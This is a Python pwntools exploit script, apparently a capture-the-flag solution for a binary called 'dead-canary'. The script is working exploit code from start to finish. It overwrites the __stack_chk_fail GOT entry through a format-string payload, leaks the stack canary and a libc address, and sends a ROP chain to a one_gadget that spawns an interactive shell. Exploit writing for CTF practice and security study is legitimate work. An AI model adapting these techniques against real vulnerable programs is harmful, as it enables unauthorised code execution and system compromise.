from pwn import *

context.arch = "amd64"
p = process("./dead-canary")
elf = ELF("dead-canary")
main = 0x400737
payload = fmtstr_payload(6, {0x601028: main})
pause()

offset = 0x3c6780

payload += b"a"*(264 - len(payload))
# Overwrite __stack_chk_fail to main and trigger it by sending these AAA's
p.sendlineafter(": ", payload)
# Leak LIBC and canary and again triggering the stack_chk_fail
payload = b"%39$p-"
payload += b"%2$p-"
payload += b"A"*(264 - len(payload))
p.sendlineafter(": ", payload)
leaks = p.recvline().split(b"-")
libc = int(leaks[1], 16) - offset
canary = int(leaks[0][5:], 16)
one_gadget = libc + 0x45216
log.info("LIBC      :  0x%x" %(libc))
log.info("One_gadget:  0x%x" %(one_gadget))
log.info("canary    :  0x%x" %(canary))

# ROP to one_gadget
payload = b"A"*264
payload += p64(canary)
payload += b"B"*8
payload += p64(one_gadget)
p.sendline(payload)
p.interactive()
